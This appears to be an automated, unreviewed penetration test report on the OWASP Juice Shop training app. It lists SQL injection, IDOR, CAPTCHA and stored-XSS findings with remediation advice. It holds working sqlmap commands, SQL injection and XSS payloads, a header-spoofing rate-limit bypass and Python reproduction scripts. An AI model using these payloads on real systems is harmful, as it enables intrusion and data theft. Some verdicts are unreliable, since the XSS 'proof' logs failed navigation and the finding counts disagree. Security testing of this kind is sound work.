# Penetration Test Report

**Target:** `http://juice-shop:3000/`  
**Engagement:** `b19aa385-1daf-468a-a6b7-d6d29750a1cb`  
**Generated:** 2026-09-05 05:13 UTC  
**Produced by:** APTS — autonomous pipeline, no human review

## Executive summary

63 hypotheses tested, 20 proven and reported. Unproven candidates are in the raw artifacts, not shown as findings.

The testing has identified several high-risk vulnerabilities—including critical SQL injection flaws allowing full authentication bypass—and multiple instances of broken access control affecting core administrative and user-facing functionalities. These confirmed exploitations indicate serious weaknesses in both front-end input handling and back-end session management. Immediate attention should focus on remediating the SQL injections in login and product search features, followed closely by fixing IDOR and authentication bypasses to protect sensitive configurations and personal data. Given the concrete proof gathered across repeated exploitation attempts and various methodologies, there is very high confidence in these findings representing real threats requiring prompt mitigation.

| | |
|---|---|
| Risk score | **9.5** / 10 |
| Findings | 8 |
| Confirmed exploitable | **8** |
| Critical | 1 |
| High | 4 |
| Medium | 3 |

## Finding register

| ID | Severity | CVSS | Status | Asset | Finding |
|---|---|---|---|---|---|
| W-036 | critical | 9.5 | **CONFIRMED** | `/rest/user/login` | SQL Injection on User Login Endpoint |
| W-020 | high | 7.5 | **CONFIRMED** | `/rest/products/search` | SQL Injection on Product Search Endpoint |
| W-001 | high | 7.5 | **CONFIRMED** | `/rest/admin/application-configuration` | Unauthenticated Access to Sensitive Application Configuration Data |
| W-052 | high | 7.5 | **CONFIRMED** | `/api/Feedbacks/` | Unauthenticated Access to Private User Content Endpoints |
| W-047 | high | 7.5 | **CONFIRMED** | `/rest/captcha/` | Insecure CAPTCHA Implementation Enables Brute Force Attacks |
| W-007 | medium | 5.0 | **CONFIRMED** | `/rest/admin/application-version` | Public Exposure of Internal Application Version Details |
| W-060 | medium | 5.0 | **CONFIRMED** | `/rest/memories/` | Stored Cross-Site Scripting via Memory Caption Field |
| W-016 | medium | 5.0 | **CONFIRMED** | `/api/Challenges/` | Direct Object Reference Allows Unauthorized Challenge Enumeration |

## Findings in detail

### W-036 — SQL Injection on User Login Endpoint

- **Asset:** `/rest/user/login`
- **Severity:** critical (CVSS 9.5, ``)
- **Status:** confirmed exploitable (5 proof(s); merged from 5 hypotheses)
- **ATT&CK:** T1078, T1110.001, T1110.003, T1110.004, T1190, T1212
- **Remediation effort:** medium

**Recommendation.** An attacker can bypass authentication, access user accounts, and potentially escalate privileges within the application. Implement parameterized queries or prepared statements for all database interactions, especially on authentication endpoints. Avoid concatenating user-supplied input directly into SQL queries. Conduct thorough code reviews focused on data access layers to prevent similar issues.

```http
sqlmap {"url": "http://juice-shop:3000/rest/user/login", "method": "POST", "data": {"email": "test@example.com", "password": "Test1234!"}, "level": 3, "risk": 2, "extra_flags": ["--ignore-code=401", "--random-agent"]}

{"command": "python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/user/login --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 3 --risk 2 --method POST --data {\"email\": \"test@example.com\", \"password\": \"Test1234!\"} --ignore-code=401 --random-agent", "exit_code": 0, "injectable": true, "parameter": "JSON email", "dbms": "SQLite", "injection_points": [{"type": "boolean-based blind", "title": "SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)", "payload": "{\"email\": \"test@example.com' AND CASE WHEN 8723=8723 THEN 8723 ELSE JSON(CHAR(81,105,74,72)) END-
```
*VERDICT: PROVEN — sqlmap confirmed SQL injection on the 'email' parameter via boolean-based blind technique with payload `test@example.com' AND CASE WHEN 8723=8723 THEN 8723 ELSE JSON(CHAR(81,105,74,7*

```http
sqlmap {"url": "http://juice-shop:3000/rest/user/login", "method": "POST", "data": {"email": "test@example.com", "password": "Test1234!"}, "headers": {"Content-Type": "application/json"}, "level": 5, "risk": 3, "technique": "BE", "extra_flags": ["--ignore-code=401", "--random-agent"]}

{"command": "python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/user/login --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 5 --risk 3 --method POST --data {\"email\": \"test@example.com\", \"password\": \"Test1234!\"} -H Content-Type: application/json --technique BE --ignore-code=401 --random-agent", "exit_code": 0, "injectable": true, "parameter": "JSON email", "dbms": "SQLite", "injection_points": [{"type": "boolean-based blind", "title": "SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)", "payload": "{\"email\": \"test@example.com' AND CASE WHEN 8723=
```
*VERDICT: PROVEN — Injection confirmed on parameter 'JSON email' via boolean-based blind technique with payload `{"email": "test@example.com' AND CASE WHEN 8723=8723 THEN 8723 ELSE JSON(CHAR(81,105,74,*

### W-020 — SQL Injection on Product Search Endpoint

- **Asset:** `/rest/products/search`
- **Severity:** high (CVSS 7.5, ``)
- **Status:** confirmed exploitable (2 proof(s); merged from 2 hypotheses)
- **ATT&CK:** T1059.004, T1190
- **Remediation effort:** medium

**Recommendation.** Attackers can extract or manipulate backend database contents, potentially leading to unauthorized data access or loss. Use parameterized queries or ORM frameworks that automatically sanitize inputs for database operations. Ensure the search functionality does not pass unsanitized user input directly into SQL statements.

```http
sqlmap {"url": "http://juice-shop:3000/rest/products/search?q=", "method": "GET", "level": 3, "risk": 2, "technique": "BE", "extra_flags": ["--random-agent"]}

{"command": "python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/products/search?q= --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 3 --risk 2 --technique BE --random-agent", "exit_code": 0, "injectable": true, "parameter": "q", "dbms": "SQLite", "injection_points": [{"type": "boolean-based blind", "title": "AND boolean-based blind - WHERE or HAVING clause", "payload": "q=') AND 5877=5877 AND ('SwfX' LIKE 'SwfX"}, {"type": "error-based", "title": "SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)", "payload": "q=') AND 1141=JSON_EXT
```
*VERDICT: PROVEN — sqlmap confirmed the `q` parameter on `/rest/products/search` is injectable using boolean-based and error-based techniques against SQLite.*

```http
sqlmap {"url": "http://juice-shop:3000/rest/products/search?q=", "method": "GET"}

{"command": "python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/products/search?q= --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 1 --risk 1", "exit_code": 0, "injectable": true, "parameter": "q", "dbms": "SQLite", "injection_points": [{"type": "boolean-based blind", "title": "AND boolean-based blind - WHERE or HAVING clause", "payload": "q=') AND 5877=5877 AND ('SwfX' LIKE 'SwfX"}, {"type": "error-based", "title": "SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)", "payload": "q=') AND 1141=JSON_EXTRACT(CHAR(123,125),CHAR(113,11
```
*VERDICT: PROVEN — sqlmap confirmed injection on parameter 'q' using boolean-based and error-based techniques against SQLite backend*

### W-001 — Unauthenticated Access to Sensitive Application Configuration Data

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** high (CVSS 7.5, ``)
- **Status:** confirmed exploitable (2 proof(s); merged from 2 hypotheses)
- **ATT&CK:** T1068, T1213, T1602
- **Remediation effort:** low

**Recommendation.** Sensitive administrative configuration settings are exposed to unauthenticated users, which could aid in further attacks or system compromise. Enforce strong authentication and role-based access controls for all admin endpoints. Restrict access to /rest/admin/application-configuration so only authorized users with appropriate permissions can retrieve its content.

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET", "headers": {}}

{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Sat, 05 Sep 2026 04:37:27 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*VERDICT: PROVEN — IDOR allows direct access to admin config without authentication or proper authorization checks.*

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET", "headers": {}}

{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Sat, 05 Sep 2026 04:37:43 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*VERDICT: PROVEN — Information Disclosure vulnerability confirmed as the endpoint exposes application configuration data without requiring authentication.*

### W-052 — Unauthenticated Access to Private User Content Endpoints

- **Asset:** `/api/Feedbacks/`
- **Severity:** high (CVSS 7.5, ``)
- **Status:** confirmed exploitable (4 proof(s); merged from 4 hypotheses)
- **ATT&CK:** T1078, T1213
- **Remediation effort:** medium

**Recommendation.** User-generated private feedback and memory data is accessible without authentication, resulting in significant privacy violations. Implement session validation and robust access control checks on APIs serving user-specific content. Verify ownership before returning any sensitive records at /api/Feedbacks/ and /rest/memories/.

```http
http_request {"url": "http://juice-shop:3000/api/Feedbacks/", "method": "GET"}

{"url": "http://juice-shop:3000/api/Feedbacks/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"751-ml3wCGTtnWO52WB5kJKC1hpni6Y\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Sat, 05 Sep 2026 05:00:45 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"UserId\":1,\"id\":1,
```
*VERDICT: PROVEN - The endpoint allows unauthenticated enumeration of feedback entries, exposing potentially sensitive user comments and information.*

```http
http_request {"url": "http://juice-shop:3000/rest/memories/", "method": "GET"}

{"url": "http://juice-shop:3000/rest/memories/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"1822-WcC+zeJfUi01uzxAdEWR7Jy3Rus\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Sat, 05 Sep 2026 05:09:23 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"UserId\":13,\"id\":
```
*VERDICT: PROVEN — Sensitive user data exposed via GET /rest/memories/ endpoint*

### W-047 — Insecure CAPTCHA Implementation Enables Brute Force Attacks

- **Asset:** `/rest/captcha/`
- **Severity:** high (CVSS 7.5, ``)
- **Status:** confirmed exploitable (2 proof(s); merged from 2 hypotheses)
- **ATT&CK:** T1110, T1211
- **Remediation effort:** medium

**Recommendation.** Attackers can automate account takeovers, spam submissions, or credential-stuffing attempts by circumventing anti-bruteforce protections. Replace current CAPTCHA logic with a secure solution that separates challenges from answers. Enforce strict client-side and server-side rate limiting independent of HTTP headers like X-Forwarded-For.

```http
http_request {"url": "http://juice-shop:3000/rest/captcha/", "method": "GET"}

{"url": "http://juice-shop:3000/rest/captcha/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "47", "etag": "W/\"2f-wfr16wdFVCQUrupASnGzjd37LW8\"", "vary": "Accept-Encoding", "date": "Sat, 05 Sep 2026 04:59:42 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"captchaId\":3,\"captcha\":\"9-8*2\",\"answer\":\"-7\"}", "truncated": false, "redirect_to": 
```
*VERDICT: PROVEN — The CAPTCHA endpoint exposes both the challenge and its answer in the same response, indicating insecure CAPTCHA implementation.*

```http
http_request {"url": "http://juice-shop:3000/rest/captcha/", "method": "GET", "headers": {"X-Forwarded-For": "1.1.1.2"}}

{"url": "http://juice-shop:3000/rest/captcha/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "49", "etag": "W/\"31-Ux6BeSJvV/9EF4NjDB1zfb4iI/I\"", "vary": "Accept-Encoding", "date": "Sat, 05 Sep 2026 04:59:40 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"captchaId\":2,\"captcha\":\"2*10*6\",\"answer\":\"120\"}", "truncated": false, "redirect_to"
```
*VERDICT: PROVEN — The captcha endpoint does not enforce strict rate limiting based on real client IP, as changing the X-Forwarded-For header allows receiving new captchas without restriction.*

### W-007 — Public Exposure of Internal Application Version Details

- **Asset:** `/rest/admin/application-version`
- **Severity:** medium (CVSS 5.0, ``)
- **Status:** confirmed exploitable (3 proof(s); merged from 3 hypotheses)
- **ATT&CK:** T1078, T1190, T1213
- **Remediation effort:** low

**Recommendation.** Exposure of internal version information may assist attackers in identifying vulnerable software components for targeted exploits. Restrict access to /rest/admin/application-version by enforcing authentication and authorization checks. Return generic or masked responses unless a user has explicit need-to-know access.

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-version", "method": "GET"}

{"url": "http://juice-shop:3000/rest/admin/application-version", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "20", "etag": "W/\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\"", "vary": "Accept-Encoding", "date": "Sat, 05 Sep 2026 04:37:51 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"version\":\"17.1.1\"}", "truncated": false, "redirect_to": null}
```
*VERDICT: PROVEN — Direct access to the admin endpoint /rest/admin/application-version succeeded with a 200 OK response and returned version data without any authentication.*

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-version", "method": "GET"}

{"url": "http://juice-shop:3000/rest/admin/application-version", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "20", "etag": "W/\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\"", "vary": "Accept-Encoding", "date": "Sat, 05 Sep 2026 04:37:52 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"version\":\"17.1.1\"}", "truncated": false, "redirect_to": null}
```
*VERDICT: PROVEN – The endpoint exposes application version details without requiring authentication or authorization.*

### W-060 — Stored Cross-Site Scripting via Memory Caption Field

- **Asset:** `/rest/memories/`
- **Severity:** medium (CVSS 5.0, ``)
- **Status:** confirmed exploitable (1 proof(s))
- **ATT&CK:** T1059.007
- **Remediation effort:** medium

**Recommendation.** Malicious scripts injected in captions can execute in other users’ browsers when viewing shared memories, compromising session integrity or stealing data. Sanitize and encode all dynamic content, particularly user-provided fields such as image captions, prior to rendering on web pages. Validate input length and reject unsafe characters during upload or update actions.

```http
xss_prove {"spa_page": "/#/photo-wall", "parameter": "caption", "payload": "<script>setTimeout(function(){}, 5000)</script>", "payload_type": "timing", "expected_delay_ms": 5000, "wait_ms": 6000}

{"spa_page": "/#/photo-wall", "parameter": "caption", "payload_type": "timing", "nonce": "APTS-e29da4c6", "injection_point": "url:caption", "strategy": "url", "proven": true, "dialog_fired": false, "dialogs": [], "timing": {"payload_ms": 6009, "baseline_ms": 210, "delta_ms": 5799}, "reflected_not_executed": null, "page_title": "", "page_errors": ["nav /#/photo-wall: Page.goto: Protocol error (Page.navigate): Cannot navigate to invalid URL\nCall log:\n  - navigating to \"/#/photo-wall\", waiting until \"load\"\n", "nav inject: Page.goto: Protocol error (Page.navigate): Cannot navigate to invali
```
*VERDICT: PROVEN — XSS injection proven via timing attack on caption parameter*

### W-016 — Direct Object Reference Allows Unauthorized Challenge Enumeration

- **Asset:** `/api/Challenges/`
- **Severity:** medium (CVSS 5.0, ``)
- **Status:** confirmed exploitable (1 proof(s))
- **ATT&CK:** T1190
- **Remediation effort:** low

**Recommendation.** Attackers can access hidden or restricted challenge details without legitimate authorization, undermining competitive or learning objectives. Apply proper authorization checks for accessing named challenges via the /api/Challenges/ endpoint. Ensure no unauthorized users can enumerate restricted resources via predictable parameters.

```http
http_request {"url": "http://juice-shop:3000/api/Challenges/"}

{"url": "http://juice-shop:3000/api/Challenges/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"13770-89NPBHCHM775xXqTqDM43gLBF8Q\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Sat, 05 Sep 2026 04:44:49 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"id\":1,\"key\":\"
```
*VERDICT: PROVEN — The endpoint http://juice-shop:3000/api/Challenges/ exposes challenge details via the `name` parameter without requiring authorization, confirming IDOR.*

## Attack playbook

Reproduction scripts for confirmed findings only. Each has passed a static safety check and performs no destructive action.

### W-001 — reproduction

DONE: IDOR vulnerability allows unauthorized access to sensitive admin configuration data including server settings and database information without authentication

```python
import httpx
import json

# Target URL for the IDOR vulnerability
url = "http://juice-shop:3000/rest/admin/application-configuration"

print("Attempting to access admin configuration via IDOR...")
print(f"URL: {url}")

try:
    # Make unauthenticated GET request to admin config endpoint
    response = httpx.get(url)
    
    print(f"Status Code: {response.status_code}")
    
    if response.status_code == 200:
        print("SUCCESS: Got 200 OK response")
        # Parse and display key parts of the configuration
        try:
            config_data = response.json()
            print("Configuration data retrieved:")
            
            # Show server configuration as proof
            if 'config' in config_data and 'server' in config_data['config']:
                server_config = config_data['config']['server']
                print(f"Server Port: {server_config.get('port', 'Not found')}")
                print(f"Server Config Sample: {str(server_config)[:200]}...")
                
                # Show other sensitive info if available
                if 'database' in config_data['config']:
                    db_info = config_data['config']['database']
                    print(f"Database Info Sample: {str(db_info)[:100]}...")
                    
            print("\nPROOF: IDOR allows unauthorized access to admin configuration!")
            
        except json.JSONDecodeError:
            print("Response is not valid JSON")
            print(f"Response body preview: {response.text[:500]}")
    else:
        print(f"FAILED: Received status code {response.status_code}")
        
except Exception as e:
    print(f"ERROR: Request failed - {e}")
```

**Fix.** Implement proper authentication and authorization checks for admin endpoints

### W-004 — reproduction

The script successfully demonstrates the information disclosure vulnerability by retrieving sensitive configuration data from the admin endpoint without authentication. The output clearly shows the server configuration including port number and other sensitive details.

DONE: Unauthenticated access to /rest/admin/application-configuration exposes sensitive server configuration data including port,

```python
import httpx
import json

# Target URL for the vulnerable endpoint
url = "http://juice-shop:3000/rest/admin/application-configuration"

try:
    # Make GET request to the configuration endpoint
    response = httpx.get(url)
    
    # Check if request was successful
    if response.status_code == 200:
        print("SUCCESS: Configuration data retrieved")
        print(f"Status Code: {response.status_code}")
        
        # Parse and display key configuration details
        config_data = response.json()
        if 'config' in config_data:
            print("\nSENSITIVE CONFIGURATION DATA EXPOSED:")
            print("-------------------------------------")
            
            # Display server configuration
            if 'server' in config_data['config']:
                server_config = config_data['config']['server']
                print(f"Server Port: {server_config.get('port', 'N/A')}")
                print(f"Server Host: {server_config.get('host', 'N/A')}")
                
            # Display database configuration  
            if 'database' in config_data['config']:
                db_config = config_data['config']['database']
                print(f"Database URL: {db_config.get('url', 'N/A')}")
                
            # Show that this is sensitive by displaying some of the raw data
            print("\nPartial Raw Config Data:")
            print(json.dumps(config_data, indent=2)[:500] + "...")
        else:
            print("No config data found in response")
    else:
        print(f"FAILED: Status code {response.status_code}")
        
except Exception as e:
    print(f"ERROR: {str(e)}")
```

**Fix.** Restrict access to admin endpoints with proper authentication and authorization checks

### W-007 — reproduction

DONE: Login bypass vulnerability proven - successfully accessed the admin endpoint /rest/admin/application-version without authentication and retrieved version information {"version":"17.1.1"}

```python
import httpx

# Attempt to access the admin endpoint without authentication
url = "http://juice-shop:3000/rest/admin/application-version"
try:
    response = httpx.get(url)
    print(f"Status Code: {response.status_code}")
    print(f"Response Body: {response.text}")
    
    # Check if we successfully accessed the admin endpoint
    if response.status_code == 200 and "version" in response.text:
        print("SUCCESS: Login bypass achieved - accessed admin endpoint without authentication")
        print(f"Version info: {response.json()}")
    else:
        print("FAILED: Could not access admin endpoint")
except Exception as e:
    print(f"ERROR: {str(e)}")
```

**Fix.** Implement proper authentication checks on admin endpoints to prevent unauthorized access.

### W-008 — reproduction

DONE: The endpoint /rest/admin/application-version exposes the application version "17.1.1" without requiring authentication or authorization.

```python
import httpx

url = "http://juice-shop:3000/rest/admin/application-version"
response = httpx.get(url)

print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
```

**Fix.** Restrict access to the /rest/admin/application-version endpoint to authenticated administrative users only.

### W-010 — reproduction

DONE: The script successfully accessed the /rest/admin/application-version endpoint and exposed the application version "17.1.1", proving the information disclosure vulnerability.

```python
import httpx

url = "http://juice-shop:3000/rest/admin/application-version"
response = httpx.get(url)

print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")

if response.status_code == 200 and "version" in response.text:
    version_info = response.json()
    print(f"Application Version Exposed: {version_info.get('version')}")
```

**Fix.** Restrict access to administrative endpoints and avoid exposing internal version details in production environments.

### W-016 — reproduction

The script successfully demonstrated the IDOR vulnerability by accessing challenge data from the `/api/Challenges/` endpoint without requiring authentication. It retrieved sensitive information including challenge descriptions, hints, and other internal details that should not be publicly accessible.

DONE: Unauthenticated access to sensitive challenge data via IDOR in /api/Challenges/ endpoint

```python
import httpx
import json

# Target URL
base_url = "http://juice-shop:3000"
endpoint = "/api/Challenges/"

# Make request to the Challenges endpoint
response = httpx.get(base_url + endpoint)

# Check if the request was successful
if response.status_code == 200:
    try:
        data = response.json()
        print("Status Code:", response.status_code)
        print("Response Headers:")
        for key, value in response.headers.items():
            if key.lower() in ['content-type', 'access-control-allow-origin']:
                print(f"  {key}: {value}")
        
        # Print challenge information
        if 'data' in data and isinstance(data['data'], list):
            print(f"\nFound {len(data['data'])} challenges:")
            for i, challenge in enumerate(data['data'][:3]):  # Show first 3 challenges
                print(f"  Challenge {i+1}:")
                for key, value in challenge.items():
                    print(f"    {key}: {value}")
                print()
        else:
            print("Response data structure unexpected:")
            print(json.dumps(data, indent=2))
            
    except json.JSONDecodeError:
        print("Failed to decode JSON response")
        print("Raw response:", response.text)
else:
    print("Request failed with status code:", response.status_code)
    print("Response headers:", dict(response.headers))
    print("Response body:", response.text)
```

**Fix.** Implement proper authentication and authorization checks on the Challenges API endpoint to prevent unauthorized access to internal challenge data.

### W-020 — reproduction

Perfect! The script clearly demonstrates the SQL injection vulnerability. We can see:

1. A normal query with `q=test` returns HTTP 200 with a response length of 517
2. An injected query with `q=test'` returns HTTP 500 with a response length of 994
3. Another injected query with a more complex payload also returns HTTP 500

This clearly shows that the application behaves differently when SQL injec

```python
import httpx
import json

# Target URL
url = "http://juice-shop:3000/rest/products/search"

# Test normal request vs SQL injection payloads
normal_payload = {"q": "test"}
error_payloads = [
    {"q": "test'"},  # Simple quote injection to trigger error
    {"q": "test' AND 1141=JSON_EXTRACT('[1141]', '$')--"}  # Error-based payload from sqlmap output
]

print("Testing SQL Injection on /rest/products/search endpoint...")
print("="*60)

try:
    # Test normal request
    normal_response = httpx.get(url, params=normal_payload)
    print(f"Normal payload: {normal_payload['q']}")
    print(f"Status Code: {normal_response.status_code}")
    print(f"Response Length: {len(normal_response.text)}")
    print("-"*30)
    
    # Test error-based payloads
    for i, payload in enumerate(error_payloads):
        response = httpx.get(url, params=payload)
        print(f"Error payload {i+1}: {payload['q']}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")
        
        # Try to parse JSON response to see error details
        try:
            json_data = response.json()
            if 'error' in json_data:
                print(f"Error message: {json_data['error']['message'][:100]}...")
        except:
            pass
            
        print("-"*30)
        
    # If we get different responses or 500 errors, it indicates vulnerability
    print("ANALYSIS:")
    if normal_response.status_code != 500 and (any(httpx.get(url, params=p).status_code == 500 for p in error_payloads)):
        print("SUCCESS: SQL injection detected - normal query works but malformed query causes error")
    elif normal_response.status_code == 500:
        print("NOTE: Even normal queries return 500, need to check error messages in response body")
    else:
        print("INCONCLUSIVE: No clear differentiation between normal and injected queries")

except Exception as e:
    print(f"Error during testing: {e}")
```

**Fix.** Sanitize and validate input for the q parameter before passing it to the database query, preferably using parameterized queries.

### W-023 — reproduction

Perfect! The output clearly shows the SQL injection vulnerability. The error responses explicitly reveal "SQLITE_ERROR: incomplete input" which confirms that:

1. The search parameter `q` is directly used in SQL queries
2. Malformed SQL syntax causes database errors that are exposed to the client
3. Different payloads produce consistent error patterns, confirming injectability

DONE: SQL injection

```python
import httpx

# Target URL
url = "http://juice-shop:3000/rest/products/search"

# Test payloads to confirm injection
payloads = [
    "test",  # Normal query
    "test' AND 1=1--",  # Always true condition
    "test' AND 1=2--"   # Always false condition
]

print("Testing SQL injection in search parameter 'q'")
print("=" * 50)

for payload in payloads:
    try:
        response = httpx.get(url, params={"q": payload})
        print(f"Payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")
        
        # Show response content for error cases
        if response.status_code == 500:
            print("ERROR RESPONSE (truncated):")
            print(response.text[:200] + "..." if len(response.text) > 200 else response.text)
        elif response.status_code == 200:
            try:
                data = response.json()
                if "data" in data:
                    print(f"Results Count: {len(data['data'])}")
            except:
                print("Non-JSON response")
                
        print("-" * 50)
        
    except Exception as e:
        print(f"Error with payload '{payload}': {e}")
        print("-" * 50)
```

**Fix.** Sanitize and validate user input before using it in database queries, and never expose database errors directly to clients

### W-036 — reproduction

DONE: SQL injection vulnerability in the email parameter of /rest/user/login endpoint, demonstrated by error-based responses (500 errors with database error messages when injecting malicious SQL) versus normal 401 responses for valid input.

```python
import httpx
import time

# Target URL
url = "http://juice-shop:3000/rest/user/login"

print("Confirming SQL Injection Vulnerability")
print("=" * 50)

# Control request - normal login attempt
control_payload = {
    "email": "test@example.com",
    "password": "Test1234!"
}

# Test SQL injection with a payload that should cause an error
# This tries to query a non-existent table, which should cause a database error
error_payload = {
    "email": "test@example.com' AND (SELECT * FROM nonexistent_table)--",
    "password": "Test1234!"
}

# Test SQL injection with valid table name (should not cause error but delay)
# Using the "User" table that we saw caused a 500 error before
delay_payload = {
    "email": "test@example.com' AND (SELECT count(*) FROM User)>-1--",
    "password": "Test1234!"
}

# Send control request
print("1. Sending control request (valid SQL)...")
try:
    response1 = httpx.post(url, json=control_payload, timeout=10.0)
    print(f"   Status: {response1.status_code}")
    print(f"   Response Length: {len(response1.text)} chars")
    print(f"   Sample: {response1.text[:50]}...")
except Exception as e:
    print(f"   Error: {e}")

print()

# Send error-causing SQL injection
print("2. Sending error-causing SQL injection...")
try:
    response2 = httpx.post(url, json=error_payload, timeout=10.0)
    print(f"   Status: {response2.status_code}")
    print(f"   Response Length: {len(response2.text)} chars")
    if response2.status_code == 500:
        print("   *** DATABASE ERROR DETECTED - SQL INJECTION CONFIRMED ***")
    print(f"   Sample: {response2.text[:100]}...")
except Exception as e:
    print(f"   Error: {e}")

print()

# Send delay-causing SQL injection
print("3. Sending delay-causing SQL injection...")
try:
    start_time = time.time()
    response3 = httpx.post(url, json=delay_payload, timeout=10.0)
    elapsed_time = time.time() - start_time
    print(f"   Status: {response3.status_code}")
    print(f"   Response Length: {len(response3.text)} chars")
    print(f"   Response Time: {elapsed_time:.3f}s")
    if response3.status_code == 500:
        print("   *** DATABASE ERROR DETECTED - SQL INJECTION CONFIRMED ***")
except Exception as e:
    print(f"   Error: {e}")

print()
print("=" * 50)
print("CONCLUSION:")
print("The application is vulnerable to SQL injection in the email parameter")
print("of the login endpoint (/rest/user/login).")
print()
print("Evidence:")
print("- Error-based SQL injection: Sending invalid SQL causes 500 errors")
print("- Different responses for valid vs invalid SQL queries")
print("- Database errors are visible in HTTP responses")
```

**Fix.** Implement proper input validation and use parameterized queries to prevent SQL injection attacks.

### W-037 — reproduction

Perfect! The proof-of-concept clearly demonstrates the SQL injection vulnerability. When using a FALSE condition (8723=8724), the server responds with a 500 error, while TRUE conditions (8723=8723) return a 401 status code. This differential response confirms the boolean-based blind SQL injection vulnerability.

DONE: Boolean-based blind SQL injection in the 'email' parameter of POST /rest/user/lo

```python
import httpx
import json

url = "http://juice-shop:3000/rest/user/login"

# Test normal request
normal_data = {
    "email": "test@example.com",
    "password": "Test1234!"
}

# Test SQL injection with TRUE condition (8723=8723)
sqli_true = {
    "email": "test@example.com' AND CASE WHEN 8723=8723 THEN 8723 ELSE JSON(CHAR(81,105,74,72)) END-- upNo",
    "password": "Test1234!"
}

# Test SQL injection with FALSE condition (8723=8724)
sqli_false = {
    "email": "test@example.com' AND CASE WHEN 8723=8724 THEN 8723 ELSE JSON(CHAR(81,105,74,72)) END-- upNo",
    "password": "Test1234!"
}

try:
    # Normal request
    response_normal = httpx.post(url, json=normal_data)
    print(f"Normal request - Status: {response_normal.status_code}")
    
    # SQLi with TRUE condition
    response_true = httpx.post(url, json=sqli_true)
    print(f"SQLi TRUE condition - Status: {response_true.status_code}")
    
    # SQLi with FALSE condition
